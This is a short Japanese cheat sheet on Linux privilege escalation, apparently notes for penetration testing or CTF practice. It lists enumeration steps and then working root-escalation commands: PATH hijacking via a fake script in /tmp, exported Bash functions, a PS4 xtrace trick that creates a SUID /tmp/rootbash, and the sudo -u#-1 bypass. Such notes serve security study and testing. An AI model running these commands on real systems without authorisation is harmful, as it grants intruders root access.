# Linux Privilege Escalation

## 実行フロー
1. sudo -lを実行
2. LinEnumを実行
3. CronTabに設定されているスクリプトを確認
4. sudoのバージョンを確認


## 確認内容
### root権限で実行できるコマンドがあるか調べる。
```
sudo -l
```

### CronTabに設定されているスクリプトを確認
相対パス or 絶対パスのどちらで指定されているか？

### SUID / SGIDのファイルを確認
バイナリファイルの中から読み取り可能な文字列を抽出し、内部で実行されているコマンドを確認。
```
strings [FILE]
```

システムコール単位での処理の流れから、実行エラーになっているライブラリやファイルなどを確認。
```
strace [FILE]
```


#### 相対パスの場合  
tmpディレクトリに同名のスクリプトを作成。
```
echo '/bin/bash -p' | tee /tmp/[FILE]; chmod +x /tmp/[FILE]
export PATH=/tmp:$PATH
```

#### 絶対パスの場合  
1. スクリプトが配置されているディレクトリに書き込み権限があるか確認
```
ls -la | grep -iF [DIRECTORY]
```

2. スクリプト自体に書き込み権限があるか確認
```
ls -la [FILE]
```

3. Bashのバージョンを確認（デフォルトシェルがBashの場合）
```
/bin/bash --version
```

・Bash < ver4.2-048  
絶対パスの名前の関数を定義する。
```
function [ABSOLUTE PATH] { /bin/bash -p; }
export -f [ABSOLUTE PATH]
```

・Bash < ver4.4  
suid-env2をデバッグモードで実行する。
Bashをデバッグモードで実行する場合、環境変数PS4が利用されるため、PS4には/bin/bashのスクリプトをtmpディレクトリにコピーし、SUIDを付与するコマンドをセットする。
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
/tmp/rootbash -p
```

### sudoのバージョンを確認
```
sudo -V
```

・sudo =< ver1.8.28  
他のユーザーとしてコマンドを実行できる権限（ALL）が与えられている必要あり。
```
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash
```

